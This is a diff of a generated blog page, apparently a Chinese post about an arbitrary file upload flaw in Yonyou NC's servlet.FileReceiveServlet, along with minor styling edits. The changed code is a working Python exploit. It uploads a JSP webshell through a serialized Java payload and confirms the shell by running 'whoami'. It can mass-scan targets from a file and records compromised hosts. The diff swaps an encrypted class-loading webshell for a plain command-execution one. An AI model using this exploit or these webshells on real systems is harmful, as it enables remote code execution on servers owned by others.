@@ -25,7 +25,7 @@
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/1uckyun/CDN@v1.0/hexo/source/libs/aos/aos.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/1uckyun/CDN@v1.0/hexo/source/libs/animate/animate.min.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/1uckyun/CDN@v1.0/hexo/source/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/1uckyun/CDN/hexo/source/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/1uckyun/CDN@v1.0/hexo/source/css/matery.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/1uckyun/CDN@v1.0/hexo/source/css/my.css">
 
     <script src="https://cdn.jsdelivr.net/gh/1uckyun/CDN@v1.0/hexo/source/libs/jquery/jquery.min.js"></script>
@@ -257,7 +257,7 @@
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
-                <div class="brand">
+                <div class="brand" style="background:#ff6b6d;border-radius:15px;">
                     <h1 class="description center-align post-title">用友NC servlet.FileReceiveServlet 任意文件上传</h1>
                 </div>
             </div>
@@ -415,7 +415,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    597
+                    598
                 </div>
                 
 
@@ -481,15 +481,27 @@ header <span class="token operator">=</span> <span class="token punctuation">{</
         <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"https://google.com"</span>
     <span class="token punctuation">}</span>
     uploadData <span class="token operator">=</span> <span class="token string">"\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"</span>
-    shellFlag<span class="token operator">=</span><span class="token triple-quoted-string string">'''&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;'''</span>
+    shellFlag<span class="token operator">=</span><span class="token triple-quoted-string string">'''&lt;%=Runtime.getRuntime().exec(request.getParameter("cmd"))%&gt;
+&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;
+&lt;%@ page import="java.io.ByteArrayOutputStream" %&gt;
+&lt;%@ page import="java.io.InputStream" %&gt;
+&lt;%
+    InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    byte[] b = new byte[1024];
+    int a = -1;
+    while ((a = in.read(b)) != -1) {
+        baos.write(b, 0, a);
+    }
+    out.write("&lt;pre&gt;" + new String(baos.toByteArray()) + "&lt;/pre&gt;");
+%&gt;'''</span>
     uploadData<span class="token operator">+=</span>shellFlag
     <span class="token keyword">try</span><span class="token punctuation">:</span>
-        req1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>u <span class="token operator">+</span> <span class="token string">"/servlet/FileReceiveServlet"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>uploadHeader<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> data<span class="token operator">=</span>uploadData<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
+        req1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>u <span class="token operator">+</span> <span class="token string">"/servlet/FileReceiveServlet"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>uploadHeader<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> data<span class="token operator">=</span>uploadData<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>
         <span class="token keyword">if</span> req1<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token punctuation">:</span>
-            req3<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token operator">+</span><span class="token string">"/t00ls.jsp"</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>
-
-            <span class="token keyword">if</span>  req3<span class="token punctuation">.</span>text<span class="token punctuation">.</span>index<span class="token punctuation">(</span>shellFlag<span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">:</span>
-                printFlag <span class="token operator">=</span> <span class="token string">"[Getshell]"</span> <span class="token operator">+</span> u<span class="token operator">+</span><span class="token string">"/t00ls.jsp"</span>  <span class="token operator">+</span> <span class="token string">"\n"</span>
+            req3<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token operator">+</span><span class="token string">"/t00ls.jsp"</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"whoami"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span>  <span class="token builtin">len</span><span class="token punctuation">(</span>req3<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+                printFlag <span class="token operator">=</span> <span class="token string">"[Getshell]"</span> <span class="token operator">+</span> u<span class="token operator">+</span><span class="token string">"/t00ls.jsp   pass: cmd"</span>  <span class="token operator">+</span> <span class="token string">"\n"</span>
                 <span class="token keyword">print</span> <span class="token punctuation">(</span>printFlag<span class="token punctuation">)</span>
                 wirte_targets<span class="token punctuation">(</span>printFlag<span class="token punctuation">,</span> <span class="token string">"vuln.txt"</span><span class="token punctuation">)</span>
     <span class="token keyword">except</span> <span class="token punctuation">:</span>
@@ -508,11 +520,11 @@ header <span class="token operator">=</span> <span class="token punctuation">{</
         args <span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
         <span class="token keyword">if</span> args<span class="token punctuation">.</span>check_url<span class="token punctuation">:</span>
             exp<span class="token punctuation">(</span>args<span class="token punctuation">.</span>check_url<span class="token punctuation">)</span>
+        
         <span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>check_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
-            multithreading<span class="token punctuation">(</span>exp<span class="token punctuation">,</span> args<span class="token punctuation">.</span>check_file<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+            multithreading<span class="token punctuation">(</span>exp<span class="token punctuation">,</span> args<span class="token punctuation">.</span>check_file<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/1uckyun/CDN/images/20211019170011.png" alt="getshell"></p>
 
                 
             </div>
